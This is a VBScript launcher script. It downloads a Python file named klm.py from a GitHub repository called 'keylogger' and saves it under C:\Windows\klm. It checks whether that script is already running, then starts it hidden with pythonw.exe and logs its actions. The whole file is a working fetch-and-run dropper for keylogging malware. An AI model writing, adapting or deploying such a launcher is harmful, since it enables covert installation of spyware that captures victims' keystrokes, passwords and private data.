Set objFSO = CreateObject("Scripting.FileSystemObject")
strURL = "https://raw.githubusercontent.com/chakibarrama/keylogger/main/klm.py"
strLocalFile = "C:\Windows\klm\klm.py"
strLogFile = "C:\Windows\klm\start.log"

' Function to log messages
Sub LogMessage(strMessage)
    Dim ts
    Set ts = objFSO.OpenTextFile(strLogFile, 8, True) ' 8 = ForAppending, True = Create if doesn't exist
    ts.WriteLine Now & " - " & strMessage
    ts.Close
End Sub

' Function to download file
Function DownloadFile(strURL, strLocalFile)
    On Error Resume Next
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objXMLHTTP.open "GET", strURL, False
    objXMLHTTP.send()

    If objXMLHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1 'adTypeBinary
        objStream.Write objXMLHTTP.ResponseBody
        objStream.Position = 0
        objStream.SaveToFile strLocalFile, 2 'adSaveCreateOverWrite
        objStream.Close
        DownloadFile = True
        LogMessage "Download successful."
    Else
        DownloadFile = False
        LogMessage "Failed to download the file. Status: " & objXMLHTTP.Status
    End If
    Set objXMLHTTP = Nothing
    Set objStream = Nothing
End Function

' Function to check for network connection
Function IsNetworkAvailable()
    On Error Resume Next
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objXMLHTTP.open "HEAD", "http://www.google.com", False
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
        IsNetworkAvailable = True
    Else
        IsNetworkAvailable = False
    End If
    Set objXMLHTTP = Nothing
End Function

' Check if the Python script 'klm.py' is specifically running
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'pythonw.exe' OR Name = 'python.exe'")
isRunning = False

For Each objProcess in colProcessList
    If Not IsNull(objProcess.CommandLine) Then
        If InStr(objProcess.CommandLine, strLocalFile) > 0 Then
            isRunning = True
            LogMessage "Found an instance of klm.py running."
            Exit For
        End If
    End If
Next

If isRunning Then
    LogMessage "Script klm.py is already running."
Else
    LogMessage "klm.py is not running."

    If IsNetworkAvailable() Then
        LogMessage "Network connection detected. Attempting to download klm.py."
        If Not DownloadFile(strURL, strLocalFile) Then
            LogMessage "Failed to download klm.py. Running the existing script."
        End If
    Else
        LogMessage "No network connection. Running the existing script."
    End If

    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "pythonw.exe " & strLocalFile, 0
    LogMessage "Script execution started."
    Set WshShell = Nothing
End If
